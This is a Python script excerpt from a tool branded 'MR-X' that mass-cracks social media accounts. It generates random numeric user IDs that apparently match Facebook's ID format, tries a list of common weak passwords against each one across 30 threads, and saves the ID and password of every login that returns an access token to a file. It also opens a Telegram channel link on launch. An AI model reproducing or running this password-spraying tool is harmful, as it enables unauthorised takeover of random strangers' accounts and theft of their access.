...
def linex():
    print("-" * 50)
os.system("xdg-open  https://t.me/mrx10team")
def ____banner____():
    print(f"""
$$\      $$\ $$$$$$$\         $$\   $$\ 
$$$\    $$$ |$$  __$$\        $$ |  $$ |
...
def Crack_xnxx():
    ...
    for a in range(limit):
        MrX = "".join(random.choice(string.digits) for _ in range(9))
        user.append(MrX)
    ...
    with ThreadPoolExecutor(max_workers=30) as Fuck_xnxx:
        ...
        for love in user:
            ids = str("100000" + love)
            passlist = ["123456", "123456789"," 1234567", "12345678","112233","123123","xxxxxx"]
...
def Mathod_fuck(ids, passlist):
    global loop, oks, cps
    sys.stdout.write(f"\rMR-X [{loop}] | OK: [{len(cps)}]")
    sys.stdout.flush()
    try:
        for pas in passlist:
            data = {
            ...
            if "access_token" in response:
                print(f"\r\rMR-X-OK | {ids} • {pas}")
                with open("MR-X-OK.txt", "a") as f:
                    f.write(ids + "|" + pas + "\n")
                oks.append(ids)
                break
